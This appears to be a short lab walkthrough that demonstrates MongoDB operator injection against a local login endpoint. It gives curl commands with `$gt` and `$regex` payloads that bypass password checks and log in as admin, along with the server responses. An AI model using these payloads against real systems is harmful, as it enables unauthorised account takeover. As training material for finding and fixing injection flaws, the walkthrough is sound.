# Finding the Bug

## Confirm the app accepts JSON logins

```bash
curl -s -c /tmp/cookies.txt -o /dev/null -w "%{http_code}" \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"hunter2"}' \
    http://127.0.0.1:8085/login
```

```
200
```

The login accepts a JSON body. MongoDB-backed apps that do this are candidates for operator injection.

## Test for operator injection

Send an object instead of a string for the `username` field:

```bash
curl -s -H 'Content-Type: application/json' \
    -d '{"username":{"$gt":""},"password":"anything"}' \
    http://127.0.0.1:8085/login
```

```json
{"ok": true, "role": "user", "username": "alice"}
```

The login succeeded without a valid password. The `$gt: ""` operator matched any non-empty username. The app is vulnerable.

## Test $regex injection for targeted login

Confirm you can target a specific username:

```bash
curl -s -H 'Content-Type: application/json' \
    -d '{"username":{"$regex":"^admin$"},"password":{"$gt":""}}' \
    http://127.0.0.1:8085/login
```

```json
{"ok": true, "role": "admin", "username": "admin"}
```

The regex matched only the admin user. Combined with `$gt: ""` for the password, you log in as admin without knowing the password.
